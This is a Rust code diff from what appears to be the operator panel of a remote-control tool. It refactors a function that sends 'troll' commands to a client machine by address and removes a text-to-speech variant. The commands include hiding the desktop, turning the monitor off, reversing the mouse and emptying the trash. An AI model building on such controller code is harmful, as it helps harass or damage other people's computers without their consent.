@@ -944,57 +944,16 @@ pub async fn upload_file_to_folder(
 #[tauri::command]
 pub async fn send_troll_command(
     addr: &str,
-    command: String,
+    command: TrollCommand,
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle,
-) -> Result<String, String> {    
-    let troll_command = match command.as_str() {
-        "HideDesktop" => TrollCommand::HideDesktop,
-        "ShowDesktop" => TrollCommand::ShowDesktop,
-        "HideTaskbar" => TrollCommand::HideTaskbar,
-        "ShowTaskbar" => TrollCommand::ShowTaskbar,
-        "HideNotify" => TrollCommand::HideNotify,
-        "ShowNotify" => TrollCommand::ShowNotify,
-        "FocusDesktop" => TrollCommand::FocusDesktop,
-        "EmptyTrash" => TrollCommand::EmptyTrash,
-        "RevertMouse" => TrollCommand::RevertMouse,
-        "NormalMouse" => TrollCommand::NormalMouse,
-        "MonitorOff" => TrollCommand::MonitorOff,
-        "MonitorOn" => TrollCommand::MonitorOn,
-        "MaxVolume" => TrollCommand::MaxVolume,
-        "MinVolume" => TrollCommand::MinVolume,
-        "MuteVolume" => TrollCommand::MuteVolume,
-        "UnmuteVolume" => TrollCommand::UnmuteVolume,
-        _ => return Err("Invalid troll command".to_string()),
-    };
-    
-    send_server_command(ServerCommand::HandleTroll(addr.parse().unwrap(), troll_command), tauri_state, app_handle).await?;
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::HandleTroll(addr.parse().unwrap(), command),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Troll command sent".to_string())
-}
-
-#[tauri::command]
-pub async fn send_troll_command_with_text(
-    addr: &str,
-    command: String,
-    text: String,
-    tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle,
-) -> Result<String, String> {    
-    // Only support SpeakText command with text parameter for now
-    if command != "SpeakText" {
-        return Err("Invalid command with text parameter".to_string());
-    }
-    
-    // Create the SpeakText command with the text parameter
-    let troll_command = TrollCommand::SpeakText(text);
-    
-    // Send the command to the client
-    send_server_command(
-        ServerCommand::HandleTroll(addr.parse().unwrap(), troll_command), 
-        tauri_state, 
-        app_handle
-    ).await?;
-
-    Ok("Text-to-speech command sent".to_string())
 }
